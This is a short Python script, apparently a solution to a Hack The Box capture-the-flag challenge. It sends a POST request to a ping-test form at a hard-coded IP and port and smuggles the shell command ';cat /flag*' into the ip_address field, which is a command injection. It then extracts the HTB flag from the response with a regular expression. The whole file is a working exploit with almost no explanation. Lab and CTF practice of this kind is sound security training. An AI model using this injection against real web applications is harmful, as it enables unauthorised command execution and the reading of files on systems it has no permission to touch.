import requests
import re

host, port = "94.237.58.172", 45165 #modify port and host 
url = f"http://{host}:{port}"

payload = ";cat /flag*" #looking for all files beggins with flag 

request_data = {
    "test": "ping",
    "ip_address":"10.30.18.174" + payload, #modify ip_address
    "submit": "Test"
}

#send request 

response = requests.post(f"{url}", data=request_data)

flag = re.search(r'HTB\{.*?\}', response.text) # return matched object 

print(flag.group(0)) #return matched string